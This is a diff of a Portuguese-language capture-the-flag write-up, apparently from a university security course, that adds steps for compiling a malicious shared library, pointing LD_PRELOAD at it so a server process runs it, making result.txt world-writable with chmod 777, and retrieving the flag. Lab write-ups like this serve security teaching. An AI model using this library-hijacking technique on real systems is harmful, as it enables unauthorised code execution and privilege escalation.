@@ -38,4 +38,29 @@ $ echo "    return 0;" >> exploit.c
 $ echo "}" >> exploit.c
 ```
 
-Os seguintes comandos criam exatamente esse programa. Mas só criando o programa nao fazemos com que o servidor corra o nosso em vez do original. Temos entao que alterar as variaveis de ambiente para que o corra.
+Os seguintes comandos criam exatamente esse programa. Mas só criando o programa nao fazemos com que o servidor corra o nosso em vez do original. Temos entao que alterar as variaveis de ambiente para que o corra. Para isso começamos por correr o seguinte comando:
+
+```bash
+$ gcc -fPIC -g -c exploit.c
+```
+Este irà gerar um ficheiro "exploit.o" a partir da compilaçao do ficheiro "exploit.c" capaz de ser utilizado numa libraria partilhada. De seguida corremos:
+
+```bash
+$ gcc -shared -o exploit.so exploit.o -lc
+```
+
+Gerando assim uma livraria partilhada "exploit.so" a partir do ficheiro "exploit.o" e ligando-a a "libc", uma livraria de C.
+
+De seguida criamos um ficheiro "env" que indica que a variavel de ambiente "LD_PRELOAD" deve ser buscada a exploit.so:
+
+```bash
+$ echo "LD_PRELOAD=/tmp/exploit.so" > env
+```
+
+Por fim, alteramos as permissoes do ficheiro "result.txt" para que todos os utilizadores consigam ler, escrever e executar:
+
+```bash
+$ chmod 777 result.txt
+```
+
+Por fim, acedemos a "result.txt", coletamos a bandeira e entregamos em ctf-fsi.fe.up.pt, verificando assim que estava correta.
